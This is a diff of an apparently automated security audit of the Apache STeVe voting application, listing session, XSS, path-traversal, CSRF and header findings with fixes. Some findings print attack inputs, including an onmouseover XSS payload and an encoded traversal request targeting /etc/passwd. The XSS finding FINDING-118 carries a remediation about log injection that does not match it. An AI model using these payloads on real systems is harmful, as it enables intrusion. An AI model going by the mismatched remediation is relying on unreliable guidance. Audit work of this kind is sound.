-The application code does not contain any explicit login endpoint or authentication handler where session token regeneration could occur. Authentication is entirely delegated to the asfquart.auth framework via decorators (@asfquart.auth.require). There is no evidence in the codebase that: (1) A new session token is generated upon successful authentication, (2) The old session token is invalidated upon re-authentication, (3) Any session fixation protections are implemented at the application level. The asfquart.session.read() call only reads existing session data — it does not create or rotate sessions. If the underlying asfquart framework does not regenerate session tokens on authentication, the application is vulnerable to session fixation attacks. An attacker who sets or knows a user's session ID before login could hijack the session after the user authenticates.
-
-**Remediation:**
-
-After successful authentication, the framework or application should: (1) Invalidate old session using await asfquart.session.destroy(), (2) Create new session with fresh token using await asfquart.session.create(), (3) Populate new session with user data (uid, fullname, email), (4) Save the new session using await asfquart.session.save(new_session). This may be handled by the asfquart framework outside the visible code scope. Verification with the framework documentation is required.
-
----
-
-#### FINDING-121: No option to terminate other sessions after authentication factor change
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 7.4.3 |
-| **Files** | v3/server/pages.py:535-549 |
-| **Source Reports** | 7.4.3.md |
-| **Related** | - | **Description:**
-
-The application provides a /profile page and a /settings page but both are stubs that only render templates with basic info. There is no password change endpoint, no MFA configuration endpoint, no 'terminate all other sessions' feature, no mechanism to list active sessions, and no per-user session invalidation trigger. Even if authentication factor changes are handled by an external identity provider (implied by the ASF/LDAP integration), the application provides no option to terminate other sessions after such a change. If a user's credentials are compromised and they change their password through an external system, all existing sessions (including those of the attacker) remain valid. The user has no way to force re-authentication on other active sessions.
-
-**Remediation:**
-
-Implement a session termination endpoint that allows users to invalidate all sessions except the current one. Example implementation: Add a POST endpoint '/do-terminate-other-sessions' that retrieves the current session ID, invalidates all other sessions for the user via session_store.invalidate_all_except(result.uid, current_session_id), logs the action, and redirects to settings. Additionally, implement session-to-user mapping to enable finding all sessions for a given PID, add active session listing functionality, and integrate session termination options into the /settings page.
-
----
-
-#### FINDING-122: No re-authentication enforced before sensitive account modifications
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 7.5.1 |
-| **Files** | v3/server/pages.py:535-548, v3/server/pages.py:83 |
-| **Source Reports** | 7.5.1.md |
-| **Related** | - | **Description:**
-
-The `/profile` and `/settings` pages exist with authentication requirements, but there is no evidence of re-authentication being enforced before modifying sensitive account attributes. While no POST handlers for profile/settings changes are currently visible in this file, the pages are defined and presumably have (or will have) modification capabilities. User has active session → navigates to `/profile` or `/settings` → only requires existing valid session → no re-authentication challenge for modifications. If an attacker gains access to an active session (XSS, session fixation, physical access to unlocked device), they could modify sensitive account attributes (email for recovery, etc.) without being challenged for credentials. This is particularly concerning given the CSRF token is a placeholder (`basic.csrf_token = 'placeholder'` at line 83).
-
-**Remediation:**
-
-Implement re-authentication middleware for sensitive operations: async def require_reauthentication(): """Check if user has recently re-authenticated (within last 5 minutes).""" s = await asfquart.session.read(); reauth_time = s.get('last_reauth'); if not reauth_time or (time.time() - reauth_time) > 300: return quart.redirect(f'/auth/reauth?return_to={quart.request.path}'); return None; @APP.post('/do-update-profile'); @asfquart.auth.require; async def do_update_profile(): redirect = await require_reauthentication(); if redirect: return redirect; # ... proceed with attribute changes
-
----
-
-#### FINDING-123: Creating elections lacks step-up authentication
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | - |
-| **ASVS Sections** | 7.5.3 |
-| **Files** | v3/server/pages.py:410-427 |
-| **Source Reports** | 7.5.3.md |
-| **Related** | - | **Description:**
-
-Creating an election — while less destructive — is a privileged operation that only requires R.pmc_member session authentication with no additional verification. The do_create_endpoint function processes election creation requests without requiring recent re-authentication or secondary verification.
-
-**Remediation:**
-
-Implement step-up authentication using the require_step_up_auth function before allowing election creation. Require recent authentication (within 5 minutes) before processing the election creation request.
-
----
-
-#### FINDING-124: No validation of session freshness or maximum time between IdP authentication events
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 7.6.1 |
-| **Files** | v3/server/pages.py:68-84 |
-| **Source Reports** | 7.6.1.md |
-| **Related** | - | **Description:**
-
-The application reads session data from the SSO provider but does not validate session freshness or enforce maximum time between IdP authentication events. There is no check of when the user last authenticated at the IdP level. If the IdP session expires or is revoked, the application's local session may continue to be valid, creating a disconnect between the IdP's authentication state and the RP's session state. This is particularly relevant for this voting system since a user removed from a PMC/committer group at the IdP level may retain voting access, and the application cannot enforce re-authentication when IdP policies change.
-
-**Remediation:**
-
-Implement IdP authentication freshness checking by validating auth_time claims from the IdP and forcing re-authentication when the maximum authentication age is exceeded. Example: Check if idp_auth_time exists in session and compare (time.time() - idp_auth_time) against MAX_IDP_AUTH_AGE (e.g., 3600 seconds). If exceeded, redirect to /auth?login= to force re-authentication at IdP.
-
----
-
-#### FINDING-125: Silent Session Creation via Federated Re-authentication Without User Consent
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 7.6.2 |
-| **Files** | v3/server/main.py:36-40 |
-| **Source Reports** | 7.6.2.md |
-| **Related** | - | **Description:**
-
-The OAuth initialization URL does not include a prompt parameter (such as prompt=login or prompt=consent). Per NIST SP 800-63C, the RP should ensure that re-authentication involves explicit user action to prevent session creation without user awareness. When a user has an active IdP session but no RP session, accessing any protected page triggers silent re-authentication and session creation. The data flow: User's RP session expires → User visits any protected page → @asfquart.auth.require decorator detects no session and redirects to OAuth → OAuth URL has no prompt parameter → If user has active IdP session at oauth.apache.org, IdP silently redirects back with auth code → RP callback creates new session without any user interaction at the RP or IdP. An attacker who can inject content into a page viewed by the victim could trigger silent session creation at the RP by embedding hidden requests to protected pages.
-
-**Remediation:**
-
-Add prompt=consent or prompt=login parameter to the OAuth initialization URL in main.py. Change OAUTH_URL_INIT to include &prompt=consent to force user interaction. Alternatively, implement a login interstitial page with an explicit 'Continue to login' button that serves as the sole OAuth entry point, ensuring users are aware of and consent to session creation before the OAuth flow begins.
-
----
-
-#### FINDING-126: Flash messages embed user-controlled input without encoding
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | CWE-79 |
-| **ASVS Sections** | 1.1.2 |
-| **Files** | v3/server/pages.py:430, v3/server/pages.py:491, v3/server/pages.py:513, v3/server/pages.py:531 |
-| **Source Reports** | 1.1.2.md |
-| **Related** | FINDING-030, FINDING-031, FINDING-032, FINDING-033, FINDING-034, FINDING-035, FINDING-127, FINDING-128 | **Description:**
-
-User-controlled input (form.title) is embedded in flash messages without HTML encoding at the point of message creation. The encoding responsibility is deferred to the template. This violates the principle of encoding as the final step before the interpreter because the control is split across two locations with no guarantee the template applies it. If the flashes.ezt template outputs these without HTML encoding, this creates a reflected XSS vulnerability.
-
-**Remediation:**
-
-Either HTML-encode at flash message creation using html.escape(), or ensure the flashes template uses [format "html"]. Example: import html; await flash_success(f'Created election: {html.escape(form.title)}')
-
----
-
-#### FINDING-127: Election titles and user names output without HTML encoding across multiple templates
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | CWE-79 |
-| **ASVS Sections** | 3.2.2 |
-| **Files** | v3/server/templates/header.ezt, v3/server/templates/admin.ezt, v3/server/templates/voter.ezt, v3/server/templates/manage.ezt, v3/server/templates/vote-on.ezt |
-| **Source Reports** | 3.2.2.md |
-| **Related** | FINDING-030, FINDING-031, FINDING-032, FINDING-033, FINDING-034, FINDING-035, FINDING-126, FINDING-128 | **Description:**
-
-User-controlled data including election titles and person names are output in multiple templates (header.ezt, admin.ezt, voter.ezt, manage.ezt, vote-on.ezt) without [format "html"] encoding. Election titles are set by PMC members during creation, and names come from PersonDB/LDAP. An attacker with PMC member or LDAP write access could inject HTML/JavaScript that renders for all users viewing the affected elections. Examples include page titles, navbar user names, card titles, and election owner names.
-
-**Remediation:**
-
-Apply [format "html"] to ALL user-controlled template variables: &lt;title&gt;Apache STeVe: [format "html"][title][end]&lt;/title&gt;, &lt;h5 class="card-title"&gt;[format "html"][owned.title][end]&lt;/h5&gt;, &lt;strong&gt;[format "html"][issues.title][end]&lt;/strong&gt;, etc.
-
----
-
-#### FINDING-128: Missing JavaScript Encoding in HTML Attributes with Template Variables
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | CWE-79 |
-| **ASVS Sections** | 1.2.3 |
-| **Files** | v3/server/templates/vote-on.ezt:throughout the &lt;script&gt; block |
-| **Source Reports** | 1.2.3.md |
-| **Related** | FINDING-030, FINDING-031, FINDING-032, FINDING-033, FINDING-034, FINDING-035, FINDING-126, FINDING-127 | **Description:**
-
-Template variables (issues.iid) are embedded in onclick attribute strings and DOM element IDs without [format "js,html"] applied. While IIDs are cryptographically generated and thus practically safe, the pattern of embedding template variables in JavaScript strings within HTML attributes without encoding is architecturally wrong. If the ID generation ever changes or a different data source is used, this becomes exploitable. This represents a defense-in-depth gap.
-
-**Remediation:**
-
-Apply [format "js,html"] to all template variables embedded in HTML attributes that contain JavaScript, for example: &lt;span onclick="toggleDescription('[format "js,html"][issues.iid][end]')"&gt;. This ensures defense-in-depth even for controlled values.
-
----
-
-#### FINDING-129: voter.ezt tab activation script embeds server value without JS encoding
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | CWE-79 |
-| **ASVS Sections** | 3.2.2 |
-| **Files** | v3/server/templates/voter.ezt |
-| **Source Reports** | 3.2.2.md |
-| **Related** | FINDING-030, FINDING-031, FINDING-032, FINDING-033, FINDING-034, FINDING-035, FINDING-126, FINDING-127 | **Description:**
-
-The voter.ezt template embeds the active_tab value into JavaScript without [format "js"] encoding: var active = "[active_tab]";. Currently, active_tab is set to fixed string values ('open', 'upcoming', 'past') in server code, so the impact is low in practice. However, the pattern is unsafe and could become exploitable if the logic changes to accept user input or if the code is refactored.
-
-**Remediation:**
-
-Apply [format "js"] encoding: var active = "[format "js"][active_tab][end]";
-
----
-
-#### FINDING-130: Missing URL encoding and HTML escaping in document link construction
+#### FINDING-118: User-controlled data interpolated into flash messages without encoding
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
 | **ASVS Level(s)** | L1, L2 |
 | **CWE** | CWE-79 |
-| **ASVS Sections** | 1.2.2, 1.3.1, 1.3.3 |
-| **Files** | v3/server/pages.py:54-56 |
-| **Source Reports** | 1.2.2.md, 1.3.1.md, 1.3.3.md |
-| **Related** | FINDING-030, FINDING-031, FINDING-032, FINDING-033, FINDING-034, FINDING-035, FINDING-126, FINDING-127 | **Description:**
+| **ASVS Sections** | 1.1.2, 1.2.1, 16.4.1 |
+| **Files** | v3/server/pages.py:393, v3/server/pages.py:440, v3/server/pages.py:502, v3/server/pages.py:527, v3/server/pages.py:547 |
+| **Source Reports** | 1.1.2.md, 16.4.1.md |
+| **Related Findings** | FINDING-029, FINDING-119, FINDING-133 |
 
-The rewrite_description() function extracts filenames from 'doc:' patterns using regex and directly injects them into href attributes and tag bodies without proper escaping. The regex ([^\s]+) captures everything after 'doc:' until whitespace, allowing an attacker to inject attribute values. For example, 'doc:"onmouseover="alert(1)"x="' results in &lt;a href="/docs/iid/"onmouseover="alert(1)"x=""&gt;...&lt;/a&gt;, creating an XSS vector via event handler injection. User-supplied description containing doc:payload pattern flows to unsanitized filename value inserted into HTML href attribute and element content.
+**Description:**
+
+User-controlled data is interpolated into flash messages without encoding. The encoding/escaping should happen at the point closest to the interpreter (the template), but if EZT templates render flash messages as raw HTML (which is typical for flash message systems that support HTML formatting), this constitutes output encoding NOT being performed as the final step. Data flow: User form input (form.title, iid from form keys) → flash message stored in session → rendered in template on next page load.
 
 **Remediation:**
 
-Apply URL encoding to the href value using urllib.parse.quote() and HTML escaping to the display text using html.escape(). Example: safe_href = quote(filename, safe=''); safe_display = html.escape(filename); return f'&lt;a href="/docs/{issue.iid}/{safe_href}"&gt;{safe_display}&lt;/a&gt;'
+Implement a sanitization function that removes or encodes characters that could enable log injection (newlines, carriage returns, and other control characters). Replace f-string logging with parameterized logging using format strings. Example: python def sanitize_for_log(value: str) -> str: if value is None: return '' return value.replace('\n', '\\n').replace('\r', '\\r').replace('\x00', '') _LOGGER.info( 'ELECTION_CREATED: uid=%s, election=%s, title=%s', sanitize_for_log(result.uid), sanitize_for_log(election.eid), sanitize_for_log(form.title), )
 
 ---
 
-#### FINDING-131: Missing explicit canonicalization validation in document serving endpoint
+#### FINDING-119: Potential reflected XSS in error page rendering via unencoded URL parameters
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L1 |
+| **CWE** | CWE-79 |
+| **ASVS Sections** | 1.2.1 |
+| **Files** | v3/server/pages.py:677-679 |
+| **Source Reports** | 1.2.1.md |
+| **Related Findings** | FINDING-029, FINDING-118, FINDING-133 |
+
+**Description:**
+
+The raise_404 function in v3/server/pages.py renders error templates with data from URL path parameters (eid and iid) without HTML encoding. Data flows from URL path (/vote-on/&lt;eid&gt;) → Quart URL-decodes → eid assigned to result.eid → passed to EZT template → rendered as HTML. If the EZT error templates (e.g., e_bad_eid.ezt) render these values without HTML encoding, a malicious URL could inject HTML/JavaScript into the error page. This creates reflected XSS in error pages, with severity dependent on template implementation which cannot be verified from provided code.
+
+**Remediation:**
+
+Apply HTML encoding to URL parameters before passing to error templates. Either: (1) Use html.escape(eid) and html.escape(iid) when assigning to result object before raise_404() call; or (2) Sanitize input by validating format (e.g., result.eid = eid if eid.isalnum() else 'invalid') to ensure only safe characters are passed to templates.
+
+---
+
+#### FINDING-120: Path traversal risk due to missing canonicalization in serve_doc
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2, L1 |
+| **CWE** | CWE-22 |
+| **ASVS Sections** | 1.1.1, 5.3.2 |
+| **Files** | v3/server/pages.py:584-600 |
+| **Source Reports** | 1.1.1.md, 5.3.2.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The `serve_doc()` function uses the user-supplied `docname` URL parameter directly in `send_from_directory()` without application-level validation. The developer explicitly acknowledged this gap with the comment `### verify the propriety of DOCNAME.` (Type B gap — developer knows validation is needed but has not implemented it). While Quart's `send_from_directory()` internally uses `safe_join()` to prevent path traversal, there is no defense-in-depth validation at the application layer. While Quart's `safe_join` provides framework-level protection, relying solely on framework internals without application-level validation creates risk if: 1) The framework is upgraded and `safe_join` behavior changes, 2) A bypass is discovered in `safe_join`, 3) The code is refactored to use a different file-serving mechanism. The explicit TODO comment indicates the developer considers this incomplete. Standard path parameters in Quart won't match `/` characters, limiting the immediate traversal risk to `..` sequences without slashes.
+
+**Remediation:**
+
+Add an explicit allowlist regex (e.g., `^[a-zA-Z0-9][a-zA-Z0-9._-]*$`) and reject requests with invalid filenames. Example implementation: python import re SAFE_DOCNAME_RE = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9._-]*$') @APP.get('/docs/&lt;iid&gt;/&lt;docname&gt;') @asfquart.auth.require async def serve_doc(iid, docname): result = await basic_info() # Validate docname: only safe characters, no traversal if not SAFE_DOCNAME_RE.match(docname) or '..' in docname: quart.abort(400) db = steve.election.Election.open_database(DB_FNAME) row = db.q_get_mayvote.first_row(result.uid, iid) if not row: quart.abort(404) return await quart.send_from_directory(DOCSDIR / iid, docname)
+
+---
+
+#### FINDING-121: Missing SMTP Header Sanitization in Voter Email Data Retrieval
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2 |
+| **CWE** | CWE-93 |
+| **ASVS Sections** | 1.3.11 |
+| **Files** | v3/steve/election.py:514-520 |
+| **Source Reports** | 1.3.11.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The method `get_voters_for_email()` retrieves voter names and email addresses for use in email notifications without enforcing sanitization for SMTP header safety. Person data originates from LDAP/external sources via `c_add_person` INSERT/UPSERT. Neither this method nor the `person` table schema enforces sanitization of email addresses or names. If person names or email addresses contain CRLF sequences (\r\n) or SMTP protocol characters, and are used in email headers (To, From, Subject) without sanitization, an attacker who can influence LDAP data or the person import process could inject additional headers or recipients into outgoing emails. The email sending implementation is not present in the provided source code, so this finding is conditional on how the returned data is used downstream.
+
+**Remediation:**
+
+Implement sanitization to remove CRLF and other SMTP-dangerous characters from header values. Add a sanitize_email_field() function that removes CR, LF, and NULL bytes using regex re.sub(r'[\r\n\x00]', '', value). Apply this sanitization to both name and email fields in the get_voters_for_email() method before returning the voter data. Example: sanitize_email_field(row.name) and sanitize_email_field(row.email).
+
+---
+
+#### FINDING-122: No length or character validation on election titles
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2, L1 |
+| **CWE** | - |
+| **ASVS Sections** | 1.3.3, 2.2.1 |
+| **Files** | v3/server/pages.py:463 |
+| **Source Reports** | 1.3.3.md, 2.2.1.md |
+| **Related Findings** | - |
+
+**Description:**
+
+User-supplied text fields (election title, issue title, issue description) are passed directly to the database without any validation. Extremely long titles could cause display issues, memory exhaustion, or denial of service. Empty titles violate logical expectations (NOT NULL ≠ non-empty). No character set validation allows control characters or other problematic content. This affects the `gather_election_data()` anti-tamper hash — maliciously crafted titles could cause issues.
+
+**Remediation:**
+
+Implement server-side validation with maximum length limits (title: 200 characters, description: 10,000 characters). Strip whitespace and validate that titles are non-empty. Example: `title = form.get('title', '').strip(); if not title: await flash_danger('Election title is required.'); return quart.redirect('/admin', code=303); if len(title) > MAX_TITLE_LENGTH: await flash_danger(f'Title must be {MAX_TITLE_LENGTH} characters or less.'); return quart.redirect('/admin', code=303)`
+
+---
+
+#### FINDING-123: Potential JavaScript injection via unescaped user-controlled data in templates
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L1 |
+| **CWE** | - |
+| **ASVS Sections** | 1.2.3 |
+| **Files** | v3/server/pages.py |
+| **Source Reports** | 1.2.3.md |
+| **Related Findings** | - |
+
+**Description:**
+
+Without access to the EZT templates, we cannot verify how template variables are rendered in JavaScript contexts. However, the application passes user-controlled data (election titles, issue titles, candidate names from labelmap) to templates. If any EZT template embeds these values directly in &lt;script&gt; blocks or JavaScript event handlers without JSON serialization or JavaScript escaping, this would enable JavaScript injection. The labelmap is particularly concerning — it's stored as JSON in the kv field and contains candidate labels and names that are user-provided during election setup. Data flow: form.title/kv.labelmap → DB storage → list_issues() → template data → potential JavaScript context in template.
+
+**Remediation:**
+
+Ensure all data passed to JavaScript contexts uses json.dumps() for serialization. Example: import json; result.issues_json = json.dumps([{'iid': i.iid, 'title': i.title, 'candidates': i.candidates} for i in result.issues])
+
+---
+
+#### FINDING-124: Incomplete documentation of input validation rules for user-supplied text fields
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L1 |
+| **CWE** | - |
+| **ASVS Sections** | 2.1.1 |
+| **Files** | v3/docs/schema.md, v3/server/pages.py |
+| **Source Reports** | 2.1.1.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The documentation (schema.md) defines structural rules for internal identifiers (eid, iid as 10-char hex, salt as 16 bytes, etc.) but fails to document validation rules for user-supplied input data including: Election title (max length, allowed characters, format), Issue title (max length, allowed characters), Issue description (max length, allowed characters, format), Vote string (votestring) format per vote type (yna: expected values, stv: ranking format), Person email format validation rules (RFC 5322 compliance), Person name (max length, allowed characters), Date inputs (expected format, range constraints), and Authorization group (authz) allowed values/format. Developers implementing or maintaining the application have no reference for what constitutes valid input. This leads to inconsistent validation (some fields validated, others not), making it difficult to verify correctness or identify gaps.
+
+**Remediation:**
+
+Create an input-validation.md document specifying validation rules for all user input fields. Document Election Title (Type: String, Required: Yes, Max length: 200 characters, Allowed: Unicode printable characters no control characters, Validation: Non-empty after trimming whitespace). Document Vote String for YNA (Type: String, Required: Yes, Allowed values: yes/no/abstain, Case-insensitive). Document Vote String for STV (Type: String, Required: Yes, Format: Comma-separated candidate labels from issue's labelmap, Validation: Each label must exist in issue.kv.labelmap, no duplicates). Include similar specifications for all other user-supplied input fields.
+
+---
+
+#### FINDING-125: No documentation of temporal consistency rules for election dates
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
 | **ASVS Level(s)** | L2 |
 | **CWE** | - |
-| **ASVS Sections** | 1.1.1 |
-| **Files** | v3/server/pages.py:559-576 |
-| **Source Reports** | 1.1.1.md |
-| **Related** | - | **Description:**
+| **ASVS Sections** | 2.1.2 |
+| **Files** | v3/docs/schema.md, v3/server/pages.py |
+| **Source Reports** | 2.1.2.md |
+| **Related Findings** | - |
 
-While Quart performs URL decoding once (correct), there is no verification that `docname` or `iid` don't contain encoded sequences that could bypass controls after the single decode. The comment `### verify the propriety of DOCNAME.` explicitly acknowledges missing canonicalization validation. Although `send_from_directory` provides path traversal protection, the `iid` is used to construct the directory path (`DOCSDIR / iid`) before being passed to `send_from_directory`, and is only implicitly validated via database lookup rather than explicit canonicalization. Data Flow: URL path (`/docs/<iid>/<docname>`) → URL-decoded once by Quart router → used directly in path construction without canonicalization verification → passed to `send_from_directory`. A request to `/docs/valid_iid/..%252f..%252fetc%252fpasswd` — if Quart's routing or send_from_directory performed additional decoding, this could bypass controls. In practice, `send_from_directory` handles this, but the architectural pattern is incorrect.
+**Description:**
 
-**Remediation:**
-
-Validate docname is a simple filename (canonical form check): if '/' in docname or '\\' in docname or docname.startswith('.'): quart.abort(400). Ensure IID matches expected format (alphanumeric crypto ID): if not iid.isalnum(): quart.abort(400). This should be done before the database lookup and before constructing the path to send_from_directory.
-
----
-
-#### FINDING-132: No Content-Security-Policy headers on HTML responses
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | - |
-| **ASVS Sections** | 3.2.1 |
-| **Files** | v3/server/templates/header.ezt |
-| **Source Reports** | 3.2.1.md |
-| **Related** | - | **Description:**
-
-Server generates HTML responses without CSP header or meta tag to restrict resource loading. If XSS occurs, attacker has full browser capability. Without CSP, any successful XSS injection has unrestricted access to inline scripts, eval(), and cross-origin resource loading. CSP would serve as a defense-in-depth layer against content rendering in unintended contexts.
+The documentation does not define rules for validating the logical consistency between `open_at` and `close_at` fields. The code (`_set_election_date` in pages.py) sets each date independently without any documented cross-field consistency rule. Without documented consistency rules, dates can be set in illogical combinations (close before open), potentially confusing election administrators and voters.
 
 **Remediation:**
 
-Add CSP via middleware or response headers using after_request decorator. For HTML responses, set Content-Security-Policy header with: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' https://www.apache.org; frame-ancestors 'none'. Also add X-Content-Type-Options: nosniff header.
+Document the expected temporal relationships: close_at must be after open_at if both are set; open_at should be in the future when the election is editable; neither date can be modified once the election is closed (enforced by trigger). Add a Date Consistency Rules section to the documentation.
 
 ---
 
-#### FINDING-133: No Sec-Fetch-* header validation on API endpoints serving sensitive data
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | - |
-| **ASVS Sections** | 3.2.1 |
-| **Files** | v3/server/pages.py |
-| **Source Reports** | 3.2.1.md |
-| **Related** | - | **Description:**
-
-API endpoints do_set_open_at_endpoint, do_set_close_at_endpoint, and serve_doc do not validate Sec-Fetch-* headers. Without Sec-Fetch-* validation, the application cannot distinguish between same-origin navigation requests and cross-origin or embed attempts, reducing defense-in-depth against CSRF and resource misuse attacks.
-
-**Remediation:**
-
-Create a validate_sec_fetch decorator that checks the Sec-Fetch-Site header and only allows 'same-origin' or 'none' values. Abort with 403 'Cross-origin request rejected' for other values. Apply this decorator to sensitive endpoints.
-
----
-
-#### FINDING-134: Form-Based POST Endpoints Accept CORS-Safelisted Content Types Without Origin Validation
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | - |
-| **ASVS Sections** | 3.5.2 |
-| **Files** | v3/server/pages.py |
-| **Source Reports** | 3.5.2.md |
-| **Related** | - | **Description:**
-
-Requests with Content-Type: application/x-www-form-urlencoded are CORS-safelisted and do NOT trigger a preflight OPTIONS request. Since there is no CSRF token validation, no Origin header validation, and no requirement for non-safelisted headers, these endpoints cannot rely on the CORS preflight mechanism for protection. Cross-origin form submissions can reach sensitive functionality without triggering a CORS preflight.
-
-**Remediation:**
-
-Implement Origin header validation using a decorator function that validates the Origin header matches expected values. If Origin is present (cross-origin request) and not in allowed_origins list, reject with 403. Additionally, implement CSRF token validation and enforce Content-Type validation on form endpoints.
-
----
-
-#### FINDING-135: Authenticated Document Endpoint Serves Files Without XSSI Protections
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | - |
-| **ASVS Sections** | 3.5.7 |
-| **Files** | v3/server/pages.py:651-666 |
-| **Source Reports** | 3.5.7.md |
-| **Related** | - | **Description:**
-
-The /docs/&lt;iid&gt;/&lt;docname&gt; endpoint serves files to authenticated users after performing fine-grained authorization checks, but does not implement browser-level origin separation controls. If JavaScript files are stored as election documents (e.g., configuration scripts, candidate data in JS format), an attacker can embed them cross-origin via &lt;script src&gt; tags and extract authorized data. The attack requires the victim to visit the attacker's page while authenticated and having mayvote access to the target issue. The server's authorization model can be circumvented because the browser sends cookies with the cross-origin request, the server authorizes it, but the response is delivered to the attacker's origin context where it can be parsed as JavaScript.
-
-**Remediation:**
-
-Add X-Content-Type-Options: nosniff and Cross-Origin-Resource-Policy: same-origin headers to the response from the serve_doc endpoint. Example implementation: @APP.get('/docs/&lt;iid&gt;/&lt;docname&gt;'); @asfquart.auth.require; async def serve_doc(iid, docname): result = await basic_info(); db = steve.election.Election.open_database(DB_FNAME); row = db.q_get_mayvote.first_row(result.uid, iid); if not row: quart.abort(404); response = await quart.send_from_directory(DOCSDIR / iid, docname); response.headers['X-Content-Type-Options'] = 'nosniff'; response.headers['Cross-Origin-Resource-Policy'] = 'same-origin'; return response
-
----
-
-#### FINDING-136: No Cross-Origin-Resource-Policy Header on Any Authenticated Endpoint
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | - |
-| **ASVS Sections** | 3.5.8 |
-| **Files** | v3/server/pages.py |
-| **Source Reports** | 3.5.8.md |
-| **Related** | - | **Description:**
-
-No Cross-Origin-Resource-Policy response header is set anywhere in the application. There is no after-request middleware adding this header. Without CORP headers, browsers rely solely on other mechanisms (SameSite cookies, CORS) to prevent cross-origin resource loading. This removes a critical defense-in-depth layer. Authenticated pages and resources can potentially be loaded in cross-origin contexts depending on cookie settings and browser behavior.
-
-**Remediation:**
-
-Implement an after_request handler that adds Cross-Origin-Resource-Policy headers to all responses: 'cross-origin' for public resources (static files, favicon), 'same-site' for landing/about pages, and 'same-origin' for all authenticated resources.
-
----
-
-#### FINDING-137: Template Triggers State-Changing GET Requests via JavaScript Navigation
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | - |
-| **ASVS Sections** | 3.5.8 |
-| **Files** | v3/server/templates/manage.ezt |
-| **Source Reports** | 3.5.8.md |
-| **Related** | - | **Description:**
-
-The manage.ezt template uses window.location.href in JavaScript to trigger state changes (open/close election) via GET requests. This confirms the architectural decision to use GET requests for state-changing operations, which is inherently vulnerable to cross-origin exploitation via links, redirects, and top-level navigations. The client-side code reinforces the server-side vulnerability by using navigational JavaScript rather than POST form submissions.
-
-**Remediation:**
-
-Replace window.location.href navigations with POST form submissions that include CSRF tokens. Create forms dynamically in JavaScript, add CSRF token as hidden input, append to document body, and submit programmatically.
-
----
-
-#### FINDING-138: State-Changing Operations Using GET Method Without SameSite Protection
+#### FINDING-126: No documentation of election state consistency with voter/issue operations
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
 | **ASVS Level(s)** | L2 |
-| **CWE** | CWE-352 |
-| **ASVS Sections** | 3.3.2 |
-| **Files** | v3/server/pages.py:468, v3/server/pages.py:490 |
-| **Source Reports** | 3.3.2.md |
-| **Related** | FINDING-019 | **Description:**
+| **CWE** | - |
+| **ASVS Sections** | 2.1.2 |
+| **Files** | v3/docs/schema.md |
+| **Source Reports** | 2.1.2.md |
+| **Related Findings** | - |
 
-State-changing operations (open/close election) use GET method at endpoints /do-open/&lt;eid&gt; and /do-close/&lt;eid&gt;. Without SameSite cookie protection, these are trivially exploitable via &lt;img&gt; tags or link preloading. Even with SameSite=Lax, GET-based state-changing operations would be vulnerable since Lax allows top-level navigation. Only SameSite=Strict would fully protect these endpoints, but they should use POST methods regardless.
+**Description:**
+
+While the code enforces state-based restrictions (e.g., can only add issues when editable, can only vote when open), these rules are not documented in the business logic documentation. Missing documentation includes: adding voters is only valid when election.salt IS NULL (editable state); adding issues is only valid when election.salt IS NULL; voting is only valid when election.salt IS NOT NULL AND closed != 1; tallying is only valid when closed = 1; issue IID must belong to the election's EID when voting; voter PID must have a mayvote entry for the issue IID. Without documented consistency rules, it's unclear what invariants the system maintains, making it harder to verify completeness of implementation.
 
 **Remediation:**
 
